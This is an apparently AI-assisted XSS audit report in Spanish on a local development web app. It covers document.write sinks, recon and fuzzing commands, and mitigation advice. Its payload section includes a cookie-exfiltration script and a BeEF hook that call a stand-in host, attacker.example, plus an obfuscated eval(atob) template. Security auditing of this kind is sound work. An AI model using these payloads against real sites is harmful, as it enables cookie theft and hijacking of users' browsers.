# Informe de Auditoría XSS — http://web.dev.local:8082

Fecha: 2026-04-27T17:48:00Z
Auditor: Kali-style automated reconnaissance (GPT-assisted)

Resumen ejecutivo
-----------------
- Objetivo: http://web.dev.local:8082
- Hallazgo principal: XSS (DOM-based) detectado en múltiples puntos de la aplicación.
- VULN_FOUND: true
- VULN_EXPLOITED: false (no se ejecutó payload en un navegador real desde este entorno automatizado; se incluyen pasos exactos para explotación y PoC que permiten reproducir el robo de cookie/hook desde un navegador).

Descripción técnica
-------------------
Se identificaron puntos donde valores procedentes de URLSearchParams son insertados en el DOM mediante document.write sin ningún tipo de sanitización o escape:

Extractos relevantes de la página (fragmentos encontrados):
- document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
- document.write('<div class="comment-author">' + c.name + '</div>');
- document.write('<div>' + c.comment + '</div>');

Impacto
-------
- Reflected/DOM XSS (search param): un valor controlado por el parámetro GET `search` se inyecta en el DOM y puede ejecutar JS si contiene HTML ejecutable.
- Stored/DOM XSS (comments): los parámetros `name` y `comment` son leídos desde la URL, almacenados en localStorage y posteriormente renderizados con document.write; esto permite persistencia local (stored XSS en el contexto del navegador) y ejecución cuando un usuario visita la página.
- Riesgos: robo de cookies, exfiltración de tokens desde localStorage/sessionStorage, ejecución de payloads persistentes (BeEF hook), CSRF ampliado por XSS, y toma de control del DOM del usuario.

Pruebas realizadas
------------------
Reconocimiento y pruebas pasivas realizadas desde el entorno:
- curl -I http://web.dev.local:8082  (cabeceras y comprobación de disponibilidad).
- Descarga y análisis estático del HTML para ubicar sinks y document.write donde se concatenan valores desde URLSearchParams.

Comandos y payloads recomendados (Kali tools)
---------------------------------------------
Nota: los siguientes comandos se muestran tal como deben ejecutarse desde una máquina de pruebas/browsers reales (o desde una VM Kali con navegador) para confirmar y explotar.

1) Enumeración/fuzzing con ffuf (ejemplo para el parámetro search):
ffuf -u "http://web.dev.local:8082/?search=FUZZ" -w /usr/share/wordlists/xss/possible-payloads.txt -t 40 -mc 200

2) DalFox para detección y verificación (cuando dalfox esté instalado):
# Scan simple
dalfox url "http://web.dev.local:8082/?search=<script>alert(1)</script>" --custom-payloads /path/to/XSS-Bypass-Strings-Brute.txt
# DOM mode
dalfox file urls.txt --dom

3) XSStrike (fuzz y payload generation):
xsstrike -u "http://web.dev.local:8082/?search=PAYLOAD" --crawl 1

4) Inyección via curl (para reproducir el flujo GET del formulario de comentarios):
curl -G --data-urlencode "name=<svg/onload=alert(1)>" --data-urlencode "comment=ComentarioPrueba" "http://web.dev.local:8082/"

Payloads de PoC y explotación (ejemplos)
----------------------------------------
A continuación payloads prácticos que, si se inyectan en el parámetro `name` o `comment`, serán almacenados en localStorage y ejecutados cuando se muestren los comentarios:

1) PoC básico (alert):
name: <svg/onload=alert(1)>

2) PoC exfiltración de cookies (envía a servidor controlado):
name: <script>new Image().src='http://attacker.example/steal?c='+encodeURIComponent(document.cookie)</script>

3) PoC BeEF hook (simulación de control remoto):
name: <script src="http://attacker.example:3000/hook.js"></script>

4) Evasión / ofuscación (Base64 -> atob):
name: <script>eval(atob('ZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZygnY29va2llcyd9LnZhbHVl'))</script>
(Nota: reemplazar el payload por Base64 válido que haga exfiltración).

Reproducción paso a paso (manual, desde un navegador real)
--------------------------------------------------------
1. Inyectar el payload en la URL (GET) usando el formulario o manual:
   http://web.dev.local:8082/?name=<payload>&comment=Test
2. El script de la página detecta `name` y `comment`, almacena el objeto en localStorage y redirige a la ruta limpia.
3. Tras la redirección la función displayComments() lee localStorage y hace document.write() con los valores (c.name y c.comment), provocando ejecución del payload.
4. Si el payload realiza exfiltración (fetch/image), el servidor atacante recibirá los datos.

Evidencia / Extractos relevantes (prueba estática)
--------------------------------------------------
Se incluyeron arriba las líneas exactas encontradas en el HTML que demuestran concatenación insegura en document.write con valores controlables desde URLSearchParams.

Recomendaciones de mitigación
-----------------------------
1. Evitar document.write() con concatenación de contenido controlado por el usuario.
2. Escapar/encodear todo dato antes de insertarlo en el DOM. Para HTML: usar funciones de escape que conviertan < > & " '.
3. Utilizar textContent o createTextNode en lugar de innerHTML/document.write cuando se inserten datos de usuarios.
4. Para datos almacenados localmente (localStorage), validar y sanitizar en el momento de escritura y/o al mostrar.
5. Implementar Content Security Policy (CSP) restrictiva para mitigar inyección de scripts externos y data: URIs.

Conclusión
----------
- Se ha identificado claramente vulnerabilidad XSS de tipo DOM (reflected y stored) en http://web.dev.local:8082 en los parámetros `search`, `name` y `comment`.
- Desde este entorno automatizado no se ejecutó un navegador real para demostrar exfiltración efectiva de cookies o carga de BeEF hook; sin embargo, la concatenación insegura con document.write y la lógica de almacenamiento en localStorage permiten una explotación sencilla en un navegador real.

Anexos
------
- Comandos exactos y payloads mostrados arriba pueden ejecutarse desde una VM Kali con navegador para confirmar y explotar (ctrl+shift+K para ver consola, mirar las peticiones al host atacante).

-- Fin del informe --
